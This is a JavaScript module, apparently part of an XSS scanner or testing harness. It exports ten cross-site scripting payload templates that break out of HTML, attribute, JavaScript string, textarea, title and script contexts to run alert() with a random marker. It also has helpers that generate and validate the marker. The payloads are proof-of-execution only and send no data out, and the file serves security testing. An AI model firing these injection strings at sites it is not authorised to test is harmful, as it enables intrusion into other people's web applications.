import { randomUUID } from 'node:crypto';

/** Execution proofs only: no callbacks, credential access, or data extraction. */
export const PAYLOADS = Object.freeze([
  { id: 'html-script', context: 'HTML text', template: "<script>alert('{marker}')</script>" },
  { id: 'html-svg', context: 'HTML text', template: "<svg onload=\"alert('{marker}')\"></svg>" },
  { id: 'attribute-double', context: 'Double-quoted attribute', template: "\"><svg onload=\"alert('{marker}')\"></svg>" },
  { id: 'attribute-single', context: 'Single-quoted attribute', template: "'><svg onload=\"alert('{marker}')\"></svg>" },
  { id: 'javascript-single', context: 'Single-quoted JavaScript string', template: "';alert('{marker}');//" },
  { id: 'javascript-double', context: 'Double-quoted JavaScript string', template: "\";alert('{marker}');//" },
  { id: 'javascript-template', context: 'JavaScript template literal', template: "${alert('{marker}')}" },
  { id: 'textarea-close', context: 'Textarea text', template: "</textarea><svg onload=\"alert('{marker}')\"></svg>" },
  { id: 'title-close', context: 'Title text', template: "</title><svg onload=\"alert('{marker}')\"></svg>" },
  { id: 'script-close', context: 'Script block', template: "</script><svg onload=\"alert('{marker}')\"></svg>" },
].map(Object.freeze));

export function makeMarker() {
  return `xss${randomUUID().replaceAll('-', '')}`;
}

export function renderPayload(payload, marker) {
  if (!payload || typeof payload.template !== 'string') {
    throw new TypeError('payload must contain a template string');
  }
  if (typeof marker !== 'string' || !/^[A-Za-z][A-Za-z0-9_]{2,128}$/u.test(marker)) {
    throw new TypeError('marker must be 3–129 letters, numbers, or underscores, starting with a letter');
  }
  return payload.template.replaceAll('{marker}', marker);
}
